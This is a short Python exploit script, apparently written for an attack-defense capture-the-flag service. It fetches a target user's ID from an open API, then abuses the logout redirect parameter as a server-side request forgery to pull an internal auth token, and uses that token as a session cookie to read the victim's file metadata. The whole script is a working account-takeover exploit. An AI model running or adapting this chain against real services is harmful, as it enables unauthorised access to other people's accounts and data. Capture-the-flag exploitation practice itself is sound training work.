#!/usr/bin/env python3

import sys
import requests
import json


def exploit(ip, flag_id):

    flag_id = json.loads(flag_id)
    user_email = flag_id['user']
    file_id = flag_id['file']

    res = requests.get(f'http://{ip}/api/auth/user/{user_email}')
    user_data = res.json()
    uuid = user_data['id']

    res = requests.get(f'http://{ip}/logout?url=http://auth/internal/token/{uuid}')
    auth_token = res.json()['token']
    
    res = requests.get(f'http://{ip}/api/files/{file_id}', cookies={'session': auth_token})
    return res.json()['metadata']


if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
